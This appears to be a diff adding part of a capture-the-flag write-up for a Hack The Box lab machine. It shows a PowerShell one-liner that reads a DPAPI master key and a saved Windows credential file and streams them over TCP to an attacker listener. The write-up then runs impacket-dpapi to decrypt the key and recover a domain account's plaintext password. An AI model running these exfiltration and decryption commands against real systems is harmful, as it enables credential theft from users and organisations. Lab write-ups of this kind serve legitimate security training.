@@ -1313,3 +1313,87 @@ dir /a C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-570
 
 C:\Users\noah.b\Desktop>
 
+```
+
+``` powershell
+
+C:\Users\noah.b\Desktop>
+
+C:\Users\noah.b\Desktop>powershell -c "$f=[IO.File]::ReadAllBytes('C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f');$t=New-Object Net.Sockets.TcpClient('10.10.15.166',9999);$t.GetStream().Write($f,0,$f.Length);$t.Close()"
+powershell -c "$f=[IO.File]::ReadAllBytes('C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f');$t=New-Object Net.Sockets.TcpClient('10.10.15.166',9999);$t.GetStream().Write($f,0,$f.Length);$t.Close()"
+
+C:\Users\noah.b\Desktop>
+
+```
+
+``` bash
+
+❯ nc -lvnp 9999 > f53fcaba-f057-48e8-8f92-0180d274bf0f
+listening on [any] 9999 ...
+connect to [10.10.15.166] from (UNKNOWN) [10.129.82.45] 51203
+❯ ls | grep 'f53fcaba-f057-48e8-8f92-0180d274bf0f'
+f53fcaba-f057-48e8-8f92-0180d274bf0f
+╭─ ~/hacking/ctf/htb/medium/danglintree/recon                                                                         ✔ ─╮
+╰─
+
+```
+
+``` powershell
+
+C:\Users\noah.b\Desktop>powershell -c "$f=[IO.File]::ReadAllBytes('C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\57FFB67D684C67F09E7153B9C7CC3940');$t=New-Object Net.Sockets.TcpClient('10.10.15.166',9999);$t.GetStream().Write($f,0,$f.Length);$t.Close()"
+powershell -c "$f=[IO.File]::ReadAllBytes('C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\57FFB67D684C67F09E7153B9C7CC3940');$t=New-Object Net.Sockets.TcpClient('10.10.15.166',9999);$t.GetStream().Write($f,0,$f.Length);$t.Close()"
+
+C:\Users\noah.b\Desktop>
+
+
+```
+
+``` bash
+
+❯ nc -lvnp 9999 > 57FFB67D684C67F09E7153B9C7CC3940
+listening on [any] 9999 ...
+connect to [10.10.15.166] from (UNKNOWN) [10.129.82.45] 51206
+❯ ls | grep '57FFB67D684C67F09E7153B9C7CC3940'
+57FFB67D684C67F09E7153B9C7CC3940
+╭─ ~/hacking/ctf/htb/medium/danglintree/recon                                                                         ✔ ─╮
+╰─                                                                                                                      ─╯
+
+```
+
+
+``` bash
+
+
+❯ impacket-dpapi masterkey -file f53fcaba-f057-48e8-8f92-0180d274bf0f -sid 'S-1-5-21-4220238332-57023728-1129110646-1602' -password 'RiverDragon#Storm25'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : f53fcaba-f057-48e8-8f92-0180d274bf0f
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 000000b0 (176)
+BackupKeyLen: 00000090 (144)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 000001ac (428)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8
+❯ impacket-dpapi credential -file 57FFB67D684C67F09E7153B9C7CC3940 -key 0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[CREDENTIAL]
+LastWritten : 2026-03-27 22:03:38+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=PC01.danglingtree.htb
+Description :
+Unknown     :
+Username    : alex.o
+Unknown     : SunsetMountainPeak@2025
+
+╭─ ~/hacking/ctf/htb/medium/danglintree/recon                                                                         ✔ ─╮
+╰─
+
+```
